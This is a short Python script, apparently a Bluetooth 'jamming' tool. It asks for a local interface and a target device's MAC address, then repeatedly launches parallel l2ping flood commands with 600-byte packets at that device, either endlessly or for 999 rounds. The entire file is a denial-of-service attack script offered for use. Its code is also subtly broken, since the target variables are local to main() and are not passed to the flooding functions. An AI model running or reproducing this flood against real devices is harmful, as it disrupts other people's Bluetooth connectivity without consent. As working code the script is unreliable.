import subprocess
import colorama
from colorama import Fore, Back, Style
import headers
colorama.init(autoreset=True)

headers.header()

BTService = ("systemctl start bluetooth.service")
subprocess.Popen(BTService, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
time = 999
def endless_jamming():
    while 1 != 0:
        xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
        xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
        xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
def limited_jamming():
    global time
    while time != 0:
        xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
        xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
        xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        time -= 1
def main():
    try:
        print(" ")
        interface = input("Your BT interface : ")
        mac = input("MAC of target: ")
        user_input = input("Do you want endless jamming? (yes/no): ")
        if user_input.lower() in ["yes", "y"]:
            print("Start jamming...")
            endless_jamming()
        else:
            print("We will give them chance...")
            limited_jamming()

    except Exception as e:
        print(" ")

main()